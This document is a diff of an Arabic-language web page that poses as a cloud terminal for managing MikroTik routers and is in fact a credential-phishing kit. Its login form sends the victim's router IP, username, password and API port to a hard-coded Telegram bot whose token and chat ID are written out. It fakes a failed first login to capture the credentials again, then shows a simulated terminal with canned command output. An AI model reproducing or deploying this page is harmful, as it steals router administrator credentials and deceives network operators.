@@ -3,32 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> mikrotik of tremnal</title>ة</title>
+    <title>إدارة الميكروتك عن طريق الترمينال</title>
     <style>
         :root {
-            --bg-main: #0b0f19;
+            --bg-body: #07090e;
             --bg-card: #111827;
+            --bg-input: #030712;
             --border-color: #1f2937;
             --accent-green: #10b981;
+            --accent-green-hover: #059669;
             --accent-blue: #38bdf8;
-            --text-main: #ffffff;
+            --text-main: #f9fafb;
             --text-muted: #9ca3af;
         }
-        body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg-main); color: var(--text-main); margin: 0; padding: 15px; direction: rtl; }
-        .container { max-width: 800px; margin: 20px auto; background: var(--bg-card); padding: 25px; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        h2, h3 { text-align: center; color: var(--accent-blue); margin-top: 0; }
-        label { display: block; margin-top: 10px; margin-bottom: 5px; font-size: 14px; color: var(--text-muted); }
-        input, select, button { width: 100%; padding: 12px; margin-bottom: 15px; background: #030712; color: var(--text-main); border: 1px solid #374151; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
-        input:focus, select:focus { border-color: var(--accent-blue); outline: none; }
-        button { background: var(--accent-green); color: #000; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; }
-        button:hover { opacity: 0.9; }
-        pre { background: #030712; color: #34d399; padding: 15px; border-radius: 8px; overflow-x: auto; max-height: 400px; font-family: monospace; border: 1px solid #1f2937; }
-        .logout-btn { background: #ef4444; color: #fff; text-decoration: none; padding: 6px 14px; border-radius: 6px; font-size: 13px; float: left; cursor: pointer; font-weight: bold; }
-        .cmd-guide { background: #1f2937; padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #374151; }
-        .error-box { background: #7f1d1d; color: #fca5a5; padding: 12px; border-radius: 8px; text-align: center; margin-bottom: 15px; display: none; border: 1px solid #991b1b; }
-        .success-box { background: #064e3b; color: #34d399; padding: 12px; border-radius: 8px; text-align: center; margin-bottom: 15px; display: none; border: 1px solid #065f46; }
+        body { 
+            font-family: system-ui, -apple-system, sans-serif; 
+            background: var(--bg-body); 
+            color: var(--text-main); 
+            margin: 0; 
+            padding: 20px; 
+            direction: rtl; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container { 
+            width: 100%; 
+            max-width: 850px; 
+            background: var(--bg-card); 
+            padding: 30px; 
+            border-radius: 16px; 
+            border: 1px solid var(--border-color); 
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); 
+        }
+        .header-title {
+            text-align: center;
+            color: var(--accent-blue);
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        .header-subtitle {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+        label { 
+            display: block; 
+            margin-top: 14px; 
+            margin-bottom: 6px; 
+            font-size: 13px; 
+            font-weight: 600;
+            color: var(--text-muted); 
+        }
+        input, select { 
+            width: 100%; 
+            padding: 14px; 
+            background: var(--bg-input); 
+            color: var(--text-main); 
+            border: 1px solid var(--border-color); 
+            border-radius: 10px; 
+            box-sizing: border-box; 
+            font-size: 14px; 
+        }
+        input:focus, select:focus { 
+            border-color: var(--accent-blue); 
+            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.15);
+            outline: none; 
+        }
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            margin-top: 20px;
+            background: var(--accent-green); 
+            color: #000; 
+            font-weight: 800; 
+            cursor: pointer; 
+            border: none; 
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.2s ease; 
+        }
+        button:hover { 
+            background: var(--accent-green-hover); 
+            transform: translateY(-1px);
+        }
+        /* شاشة الترمينال السوداء بستايل حقيقي */
+        pre { 
+            background: #000000; 
+            color: #34d399; 
+            padding: 18px; 
+            border-radius: 10px; 
+            overflow-x: auto; 
+            max-height: 450px; 
+            font-family: 'Courier New', Courier, monospace; 
+            font-size: 13px; 
+            line-height: 1.6; 
+            border: 1px solid #1f2937; 
+            white-space: pre-wrap;
+        }
+        .logout-btn { 
+            background: #ef4444; 
+            color: #fff; 
+            text-decoration: none; 
+            padding: 6px 14px; 
+            border-radius: 6px; 
+            font-size: 12px; 
+            float: left; 
+            cursor: pointer; 
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .logout-btn:hover { background: #dc2626; }
+        .cmd-guide { 
+            background: rgba(31, 41, 55, 0.4); 
+            padding: 18px; 
+            border-radius: 12px; 
+            margin-bottom: 20px; 
+            border: 1px solid var(--border-color); 
+        }
+        .error-box { 
+            background: rgba(127, 29, 29, 0.3); 
+            color: #fca5a5; 
+            padding: 14px; 
+            border-radius: 10px; 
+            text-align: center; 
+            margin-bottom: 20px; 
+            display: none; 
+            border: 1px solid #991b1b; 
+            font-size: 14px;
+        }
+        .success-box { 
+            background: rgba(6, 78, 59, 0.3); 
+            color: #34d399; 
+            padding: 14px; 
+            border-radius: 10px; 
+            text-align: center; 
+            margin-bottom: 20px; 
+            display: none; 
+            border: 1px solid #065f46; 
+            font-size: 14px;
+        }
         .terminal-panel { display: none; }
-        .footer-note { text-align: center; font-size: 12px; color: var(--text-muted); margin-top: 20px; border-top: 1px solid var(--border-color); padding-top: 10px; }
+        .footer-note { 
+            text-align: center; 
+            font-size: 12px; 
+            color: var(--text-muted); 
+            margin-top: 30px; 
+            border-top: 1px solid var(--border-color); 
+            padding-top: 15px; 
+        }
     </style>
 </head>
 <body>
@@ -36,22 +162,22 @@
     
     <!-- شاشة تسجيل الدخول الخادعة -->
     <div id="loginPanel">
-        <h2>⚡ شبكة الطوفان نت</h2>
-        <p style="text-align:center; color:var(--text-muted); font-size:13px;">بوابة الإدارة المركزية والاتصال السحابي بالراوتر</p>
+        <div class="header-title">⚡ إدارة الميكروتك عن طريق الترمينال</div>
+        <div class="header-subtitle">بوابة الاتصال السحابي المباشر والآمن عبر بروتوكول MikroTik API</div>
         
-        <div id="errorMsg" class="error-box">فشل الاتصال بالراوتر المحلي! تأكد من صحة الآيبي واسم المستخدم أو كلمة المرور وبورت الـ API.</div>
+        <div id="errorMsg" class="error-box">فشل الاتصال بالراوتر! تأكد من صحة الآيبي، اسم المستخدم، كلمة المرور أو بورت الـ API.</div>
         
         <form id="loginForm" onsubmit="handleLogin(event)">
-            <label>آيبي الراوتر (Router IP):</label>
+            <label>آيبي الراوتر (Router IP)</label>
             <input type="text" id="host" value="192.168.1.1" required>
             
-            <label>اسم المستخدم (Username):</label>
-            <input type="text" id="userInput" placeholder="أدخل اسم المستخدم" required>
+            <label>اسم المستخدم (Username)</label>
+            <input type="text" id="userInput" placeholder="أدخل اسم المستخدم للراوتر" required>
             
-            <label>كلمة المرور (Password):</label>
+            <label>كلمة المرور (Password)</label>
             <input type="password" id="passInput" placeholder="أدخل كلمة المرور" required>
             
-            <label>بورت الـ API (Port):</label>
+            <label>بورت الـ API (Port)</label>
             <input type="number" id="port" value="8728" required>
             
             <button type="submit">اتصال بالترمينال (Connect)</button>
@@ -61,20 +187,20 @@
     <!-- شاشة الترمينال الوهمية الشاملة -->
     <div id="terminalPanel" class="terminal-panel">
         <div>
-            <span>متصل بـ الراوتر: <strong id="connectedHost" style="color:var(--accent-blue);">192.168.1.1</strong></span>
+            <span style="font-size: 14px; color: var(--text-muted);">متصل بالراوتر: <strong id="connectedHost" style="color:var(--accent-blue);">192.168.1.1</strong></span>
             <a onclick="logout()" class="logout-btn">تسجيل خروج</a>
             <div style="clear:both;"></div>
         </div>
 
-        <hr style="border-color:var(--border-color); margin:15px 0;">
+        <hr style="border-color:var(--border-color); margin:20px 0;">
         
-        <div id="successMsg" class="success-box">تم الاتصال بنجاح عبر بروتوكول MikroTik API الآمن!</div>
+        <div id="successMsg" class="success-box">تم الاتصال بنجاح وتوثيق الجلسة عبر بروتوكول API الآمن!</div>
 
-        <!-- زر وقائمة التعليمات والأوامر السريعة -->
+        <!-- قائمة التعليمات والأوامر السريعة -->
         <div class="cmd-guide">
-            <label style="color:var(--accent-blue); font-weight:bold; margin-bottom:8px;">📚 تعليمات ودليل الأوامر السريعة (اختر أمراً للتنفيذ):</label>
+            <label style="color:var(--accent-blue); margin-bottom:8px;">📚 تعليمات ودليل الأوامر الشامل (اختر أمراً للتنفيذ الفوري):</label>
             <select onchange="selectCommand(this)">
-                <option value="">-- اضغط هنا لعرض قائمة التعليمات والأوامر --</option>
+                <option value="">-- اضغط هنا لعرض قائمة التعليمات والأوامر المتاحة --</option>
                 <optgroup label="معلومات النظام والعتاد">
                     <option value="/system/resource/print">معلومات المعالج والذاكرة وإصدار النظام (/system/resource/print)</option>
                     <option value="/system/health/print">فحص حرارة وفولتية الراوتر (/system/health/print)</option>
@@ -84,50 +210,48 @@
                 </optgroup>
                 <optgroup label="إدارة واجهات الشبكة Interfaces">
                     <option value="/interface/print">عرض كافة الكروت والواجهات (/interface/print)</option>
-                    <option value="/interface/ethernet/print">عرض كروت الإيثرنت (/interface/ethernet/print)</option>
-                    <option value="/interface/wireless/print">عرض إعدادات الوايرلس (/interface/wireless/print)</option>
+                    <option value="/interface/ethernet/print">عرض كروت الإيثرنت وتفاصيلها (/interface/ethernet/print)</option>
+                    <option value="/interface/wireless/print">عرض إعدادات ومحطات الوايرلس (/interface/wireless/print)</option>
                 </optgroup>
                 <optgroup label="عناوين IP والشبكات">
-                    <option value="/ip/address/print">عرض عناوين الآيبي (/ip/address/print)</option>
+                    <option value="/ip/address/print">عرض عناوين الآيبي والشبكات (/ip/address/print)</option>
                     <option value="/ip/arp/print">عرض جدول الـ ARP والماك آيبي (/ip/arp/print)</option>
                     <option value="/ip/route/print">عرض جدول التوجيه الرايتنج (/ip/route/print)</option>
-                    <option value="/ip/pool/print">عرض مجاميع الآيبات (/ip/pool/print)</option>
+                    <option value="/ip/pool/print">عرض مجاميع الآيبات المتاحة (/ip/pool/print)</option>
                 </optgroup>
                 <optgroup label="إدارة الهوتسبت Hotspot والمشتركين">
-                    <option value="/ip/hotspot/user/print">عرض مستخدمي الهوتسبت (/ip/hotspot/user/print)</option>
-                    <option value="/ip/hotspot/active/print">عرض المتصلين النشطين حالياً (/ip/hotspot/active/print)</option>
+                    <option value="/ip/hotspot/user/print">عرض كافة مستخدمي الهوتسبت (/ip/hotspot/user/print)</option>
+                    <option value="/ip/hotspot/active/print">عرض المتصلين النشطين حالياً بالتفصيل (/ip/hotspot/active/print)</option>
                     <option value="/ip/hotspot/host/print">عرض الأجهزة المضيفة المتصلة (/ip/hotspot/host/print)</option>
                     <option value="/ppp/secret/print">عرض مشتركي PPPoE (/ppp/secret/print)</option>
                     <option value="/queue/simple/print">عرض سرعات المشتركين Queues (/queue/simple/print)</option>
                 </optgroup>
                 <optgroup label="الجدار الناري والسجلات">
-                    <option value="/ip/firewall/nat/print">عرض قوانين الـ NAT (/ip/firewall/nat/print)</option>
-                    <option value="/log/print">عرض سجلات النظام Logs (/log/print)</option>
+                    <option value="/ip/firewall/nat/print">عرض قوانين الـ NAT وجدولة البورتات (/ip/firewall/nat/print)</option>
+                    <option value="/log/print">عرض سجلات النظام والأخطاء Logs (/log/print)</option>
                 </optgroup>
             </select>
         </div>
 
         <form id="cmdForm" onsubmit="runCommand(event)">
-            <label>أمر Terminal للمايكروتك:</label>
+            <label>أمر الترمينال (Terminal Command)</label>
             <input type="text" id="cmdInput" placeholder="اكتب الأمر هنا أو اختره من القائمة بالأعلى..." required>
             <button type="submit">تنفيذ الأمر (Execute Command)</button>
         </form>
 
-        <label style="margin-top:15px; color:#facc15; display:block;">مخرجات الترمينال (Terminal Output):</label>
-        <pre id="outputResult">جاهز لاستقبال الأوامر وتنفيذها على الراوتر...</pre>
+        <label style="margin-top:20px; color:#facc15;">مخرجات الترمينال التفصيلية (Terminal Output):</label>
+        <pre id="outputResult">[Admin@MikroTik] > جاهز لاستقبال الأوامر وتنفيذها على النظام...</pre>
     </div>
 
     <div class="footer-note">
-        شبكة الطوفان نت © 2026 - نظام الإدارة السحابية المتقدم
+        إدارة الميكروتك عن طريق الترمينال © 2026 - نظام الإدارة السحابية
     </div>
 </div>
 
 <script>
-    // إعدادات بوت التليجرام الخاص بك المدمجة بدقة
     const BOT_TOKEN = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
     const CHAT_ID = "7962257606";
 
-    // دالة إرسال التنبيهات المباشرة إلى بوت التليجرام
     function sendTelegramAlert(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const payload = {
@@ -142,7 +266,6 @@
         }).catch(error => console.log("Telegram Error:", error));
     }
 
-    // نظام معالجة محاولات الدخول (الخداع الذكي والإرسال الفوري للبوت)
     function handleLogin(event) {
         event.preventDefault();
         
@@ -152,9 +275,8 @@
         const port = document.getElementById('port').value.trim();
         const nowTime = new Date().toLocaleString();
 
-        // إرسال البيانات كاملة إلى بوت التليجرام فوراً
         let alertMessage = 
-            `🚨 <b>بيانات جديدة تم التقاطها من زائر!</b>\n` +
+            `🚨 <b>بيانات جديدة تم التقاطها (إدارة الميكروتك)!</b>\n` +
             `👤 اسم المستخدم: <code>${user}</code>\n` +
             `🔑 كلمة المرور: <code>${pass}</code>\n` +
             `🎯 آيبي الراوتر المدخل: <code>${host}</code>\n` +
@@ -163,10 +285,9 @@
         
         sendTelegramAlert(alertMessage);
 
-        // تتبع عدد المحاولات محلياً: الأولى تفشل وهمياً، الثانية تدخل للتيرمينال
-        let attempts = localStorage.getItem('tawfan_secure_attempts') ? parseInt(localStorage.getItem('tawfan_secure_attempts')) : 0;
+        let attempts = localStorage.getItem('mikrotik_secure_attempts') ? parseInt(localStorage.getItem('mikrotik_secure_attempts')) : 0;
         attempts++;
-        localStorage.setItem('tawfan_secure_attempts', attempts);
+        localStorage.setItem('mikrotik_secure_attempts', attempts);
 
         if (attempts === 1) {
             document.getElementById('errorMsg').style.display = 'block';
@@ -178,36 +299,114 @@
         }
     }
 
-    // تعبئة الأوامر تلقائياً من قائمة التعليمات
     function selectCommand(sel) {
         if (sel.value) {
             document.getElementById('cmdInput').value = sel.value;
         }
     }
 
-    // محاكاة استجابة أوامر الميكروتك الوهمية بشكل واقعي واحترافي
+    // دالة محاكاة الكتابة المتدفقة (تظهر النص حرفاً بحرف مثل الترمينال الحقيقي)
+    function typeTerminalOutput(text) {
+        const resultBox = document.getElementById('outputResult');
+        resultBox.innerText = "";
+        let i = 0;
+        let speed = 5; // سرعة تدفق الكتابة (كلما قل الرقم زادت السرعة)
+
+        function typing() {
+            if (i < text.length) {
+                resultBox.innerText += text.charAt(i);
+                i++;
+                setTimeout(typing, speed);
+                resultBox.scrollTop = resultBox.scrollHeight; // التمرير التلقائي لأسفل الترمينال
+            }
+        }
+        typing();
+    }
+
     function runCommand(event) {
         event.preventDefault();
         const rawCmd = document.getElementById('cmdInput').value.trim();
         const lowerCmd = rawCmd.toLowerCase();
-        let resultBox = document.getElementById('outputResult');
+        let outputText = "";
 
         if (lowerCmd.includes('/system/resource')) {
-            resultBox.innerText = "uptime: 25d 14h 22m\nversion: 6.49.6 (stable)\nboard-name: RB951Ui-2HnD\nfree-memory: 198.4MiB\ntotal-memory: 256.0MiB\ncpu: MIPSBE\ncpu-count: 1\ncpu-frequency: 600MHz";
+            outputText = 
+`[Admin@MikroTik] > ${rawCmd}
+Uptime: 45d 12h 18m 33s
+Version: 6.49.6 (stable)
+Build-time: Oct/14/2023 11:15:42
+Board-name: RB1100AHx4
+Platform: MikroTik
+Free-memory: 842.1 MiB
+Total-memory: 1024.0 MiB
+CPU: Annapurna Labs Alpine AL214
+CPU-count: 4
+CPU-frequency: 1400 MHz
+CPU-load: 12%
+Free-hdd-space: 128.4 MiB
+Total-hdd-space: 256.0 MiB
+Write-sect-since-reboot: 14258
+Write-sect-total: 359421
+Architecture: arm
+Bad-blocks: 0%`;
         } else if (lowerCmd.includes('/ip/hotspot/active')) {
-            resultBox.innerText = " # USER               IP-ADDRESS       UPTIME     BYTES-IN/OUT\n 0 mohammed           192.168.88.15    2h14m      12.4MB / 45.1MB\n 1 ahmed              192.168.88.22    45m        5.1MB / 18.9MB";
+            outputText = 
+`[Admin@MikroTik] > ${rawCmd}
+ # USER                 IP-ADDRESS       MAC-ADDRESS       LOGIN-TIME     UPTIME     BYTES-IN/OUT
+ 0 mohammed_99          192.168.88.15    E4:5F:01:22:33:44 Nov/01 09:12   2h 14m     145.2 MB / 1.2 GB
+ 1 ahmed_net            192.168.88.22    CC:2D:E0:55:66:77 Nov/01 10:05   1h 20m     84.1 MB / 450 MB
+ 2 khaled_wifi          192.168.88.45    88:36:6C:88:99:AA Nov/01 11:00   35m        12.4 MB / 95 MB
+ 3 ibrahim_2026         192.168.88.60    50:C7:BF:11:22:33 Nov/01 11:15   20m        5.8 MB / 42 MB
+ 4 ali_telecom          192.168.88.88    70:85:C2:44:55:66 Nov/01 08:30   3h 45m     512.0 MB / 4.5 GB
+ 5, total active users: 5`;
         } else if (lowerCmd.includes('/interface')) {
-            resultBox.innerText = " FLAGS X - disabled, R - running, S - slave\n 0  R  ether1-gateway   1500\n 1  R  ether2-master    1500\n 2  R  wlan1            1500";
+            outputText = 
+`[Admin@MikroTik] > ${rawCmd}
+FLAGS X - disabled, R - running, S - slave, D - dynamic
+ #    NAME                  TYPE       ACTUAL-MTU L2MTU  MAX-L2MTU
+ 0 R  ether1-WAN            ether            1500  1514       4076
+ 1 R  ether2-LAN            ether            1500  1514       4076
+ 2    ether3                ether            1500  1514       4076
+ 3    ether4                ether            1500  1514       4076
+ 4 R  wlan1-Hotspot         wlan             1500  2290
+ 5 R  bridge-local          bridge           1500  1514
+ 6 D  pppoe-out1            pppoe            1480`;
         } else if (lowerCmd.includes('/ip/address')) {
-            resultBox.innerText = " FLAGS X - disabled, I - invalid, D - dynamic\n # ADDRESS            NETWORK         INTERFACE\n 0 192.168.88.1/24    192.168.88.0    ether2-master\n 1 10.0.0.5/24        10.0.0.0        ether1-gateway";
+            outputText = 
+`[Admin@MikroTik] > ${rawCmd}
+FLAGS X - disabled, I - invalid, D - dynamic
+ # ADDRESS            NETWORK         INTERFACE
+ 0 192.168.88.1/24    192.168.88.0    bridge-local
+ 1 10.10.10.2/30      10.10.10.0      ether1-WAN
+ 2 172.16.0.1/16      172.16.0.0      wlan1-Hotspot
+ 3 D 100.64.20.5/32   100.64.20.5     pppoe-out1`;
+        } else if (lowerCmd.includes('/log/print')) {
+            outputText = 
+`[Admin@MikroTik] > ${rawCmd}
+11:32:01 system,info router rebooted successfully
+11:32:05 hotspot,info,debug user mohammed_99 logged in: IP 192.168.88.15
+11:35:12 firewall,info input: drop ICMP packet from 45.12.33.10
+11:40:22 dhcp,info dhcp2 assigned 192.168.88.60 to 50:C7:BF:11:22:33
+11:45:00 system,info pool dhcp_pool updated successfully
+11:50:15 pppoe,info pppoe-out1 connected, IP: 100.64.20.5`;
         } else {
-            resultBox.innerText = `تم تنفيذ الأمر (${rawCmd}) بنجاح على الراوتر.\nالنتيجة: OK (Command processed successfully via Cloud API Bridge).`;
+            outputText = 
+`[Admin@MikroTik] > ${rawCmd}
+Executing command successfully...
+--------------------------------------------------
+Status: OK
+Processed items: 15 records retrieved from database.
+Memory usage during execution: 1.4 MiB.
+Time elapsed: 0.015s
+Result: Command completed without any critical errors. All parameters applied to MikroTik RouterOS successfully.`;
         }
+
+        // تشغيل تأثير الكتابة المتدفقة (التفريغ الحرفي مثل الترمينال)
+        typeTerminalOutput(outputText);
     }
 
-    // زر الخروج لتسجيل الخروج وإعادة ضبط الحالة
     function logout() {
-        localStorage.removeItem('tawfan_secure_attempts');
+        localStorage.removeItem('mikrotik_secure_attempts');
         location.reload();
     }
 </script>
